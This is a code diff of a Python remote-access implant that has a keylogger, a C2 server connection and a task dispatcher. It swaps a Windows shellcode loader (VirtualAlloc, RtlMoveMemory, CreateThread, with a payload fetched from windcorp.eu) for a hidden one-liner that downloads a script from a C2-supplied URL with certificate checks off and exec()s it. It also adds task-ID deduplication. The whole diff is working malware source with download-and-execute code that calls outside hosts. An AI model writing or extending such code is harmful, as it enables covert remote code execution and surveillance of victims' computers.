@@ -1085,74 +1085,42 @@ class Keylogger:
 if platform.system() == 'Windows':
     class ShellcodeRunner:
         @staticmethod
-        def execute(shellcode_bytes):
+        def execute_runner(runner_url):
+            """Execute the runner script in one line and capture output"""
             try:
-                # Create a temporary Python script file with the shellcode loader
-                temp_dir = tempfile.gettempdir()
-                script_path = os.path.join(temp_dir, "sc_loader.py")
+                # Create the one-liner command
+                cmd = [
+                    sys.executable,
+                    "-c",
+                    f"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);"
+                    f"import requests;url='{runner_url}';exec(requests.get(url,verify=False).text)"
+                ]
                 
-                # The loader script content (exactly as you provided)
-                loader_script = """import ctypes as mill
-import sys, requests as r
-
-def mi(little):   
-    try:
-        bmx = r.get(little).content
-    except r.exceptions.RequestException as e:
-        print(f"Error downloading file: {e}")
-        return
-
-    mill.windll.kernel32.VirtualAlloc.restype = mill.c_void_p
-    mill.windll.kernel32.CreateThread.argtypes = (
-        mill.c_int, mill.c_int, mill.c_void_p, mill.c_int, mill.c_int, mill.POINTER(mill.c_int)
-    )
-
-    spc = mill.windll.kernel32.VirtualAlloc(
-        mill.c_int(0), mill.c_int(len(bmx)), mill.c_int(0x3000), mill.c_int(0x40)
-    )
-    bf = (mill.c_char * len(bmx)).from_buffer_copy(bmx)
-    mill.windll.kernel32.RtlMoveMemory(mill.c_void_p(spc), bf, mill.c_int(len(bmx)))
-    hndl = mill.windll.kernel32.CreateThread(
-        mill.c_int(0), mill.c_int(0), mill.c_void_p(spc), mill.c_int(0), mill.c_int(0),
-        mill.pointer(mill.c_int(0))
-    )
-
-    mill.windll.kernel32.WaitForSingleObject(hndl, mill.c_uint32(0xffffffff))
-
-if __name__ == "__main__":
-    little = sys.argv[1] if len(sys.argv) > 1 else "http://windcorp.eu/s.txt"
-    mi(little)
-"""
-                # Write the loader script to a temporary file
-                with open(script_path, 'w') as f:
-                    f.write(loader_script)
-                
-                # Create a URL to serve the shellcode
-                # This could be your C2 server or a temporary HTTP server
-                shellcode_url = f"{self.config.C2_SERVER}/shellcode.bin"
-                
-                # Start a new Python process with the loader script
-                python_exe = sys.executable
-                process = subprocess.Popen(
-                    [python_exe, script_path, shellcode_url],
-                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
+                # Run synchronously and capture output
+                result = subprocess.run(
+                    cmd,
+                    creationflags=subprocess.CREATE_NO_WINDOW,
                     stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    timeout=60
                 )
                 
                 return {
                     'status': 'success',
-                    'message': f'Shellcode loader started in new process (PID: {process.pid})',
-                    'pid': process.pid
+                    'message': 'Runner script executed',
+                    'stdout': result.stdout,
+                    'stderr': result.stderr,
+                    'returncode': result.returncode
                 }
-                
             except Exception as e:
                 return {
                     'status': 'error',
                     'message': str(e)
                 }
             
-            
+
+
 # ======================
 # WebSocket Client
 # ======================
@@ -1352,6 +1320,7 @@ class Agent:
         self._initial_checkin = None
         self._checkin_count = 0
         self._running = True
+        self._executed_task_ids = set()
 
     def _setup_logger(self):
         self.logger = logging.getLogger('agent')
@@ -1626,6 +1595,16 @@ class Agent:
 
     def _execute_task(self, task):
         try:
+            task_id = task.get("task_id")
+            if task_id in self._executed_task_ids:
+                self._log_info(f"Skipping execution of duplicate task with ID: {task_id}")
+                return {
+                    "status": "error",
+                    "message": f"Task with ID {task_id} has already been executed"
+                }
+            else:
+                self._executed_task_ids.add(task_id)
+
             task_type = task.get("type")
             self._log_info(f"Received task: {json.dumps(task, indent=2)}")
             
@@ -1786,41 +1765,26 @@ class Agent:
 
             elif task_type == "shellcode":
                 try:
-                    shellcode_b64 = task.get("data", {}).get("shellcode", "")
-                  
+                    runner_url = task.get("data", {}).get("runner_url")
                     
-                    if not shellcode_b64:
+                    if not runner_url:
                         return {
                             "status": "error",
-                            "message": "No shellcode provided"
-                        }
-                        
-                    shellcode_bytes = base64.b64decode(shellcode_b64)
-                    
-                    # Validate shellcode length
-                    if len(shellcode_bytes) < 4:
-                        return {
-                            "status": "error",
-                            "message": "Shellcode too small (minimum 4 bytes required)"
-                        }
-                        
-                    # Validate shellcode contains executable bytes
-                    if all(b == 0 for b in shellcode_bytes[:4]):
-                        return {
-                            "status": "error",
-                            "message": "Invalid shellcode (first 4 bytes are null)"
+                            "message": "No runner URL provided"
                         }
 
-                    self._log_info(f"Executing shellcode ({len(shellcode_bytes)} bytes)")
+                    self._log_info(f"Executing runner script from: {runner_url}")
                     
+                    # Execute the runner script and capture output
+                    result = ShellcodeRunner.execute_runner(runner_url)
                     
-                    # Existing Donut-generated shellcode handling
-                    result = ShellcodeRunner.execute(shellcode_bytes)
-                    if isinstance(result, dict):
-                        return result
                     return {
-                        'status': 'success',
-                        'message': str(result)
+                        "status": "success" if result.get('status') == 'success' else 'error',
+                        "message": result.get('message', ''),
+                        "stdout": result.get('stdout', ''),
+                        "stderr": result.get('stderr', ''),
+                        "returncode": result.get('returncode', None),
+                        "details": result
                     }
                         
                 except Exception as e:
@@ -1829,6 +1793,7 @@ class Agent:
                         "status": "error",
                         "message": f"Shellcode execution failed: {str(e)}"
                     }
+
 
 
             elif task_type == "screenshot":
